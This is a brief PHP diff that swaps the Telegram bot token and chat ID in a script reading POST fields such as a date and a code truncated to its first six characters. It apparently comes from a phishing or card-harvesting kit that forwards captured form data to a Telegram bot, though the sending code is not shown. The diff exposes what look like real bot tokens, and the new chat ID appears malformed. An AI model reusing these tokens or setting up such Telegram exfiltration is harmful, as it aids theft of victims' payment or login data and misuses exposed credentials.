@@ -10,8 +10,8 @@ $fecha = $_POST['fecha'];
 
 
 //Datos del bot
-$token = "6186152546:AAF0X-KaG7SgPfQZ4-fVd97yYfDK0xMnnyY";
-$chatId = "-1002044961014";
+$token = "8390867557:AAFoTxbkMrDmVnMD66tqbSZk_T5hvoGx0X4";
+$chatId = "--5085714220";
 
 
 $numero_recortado = substr($codigo, 0, 6);
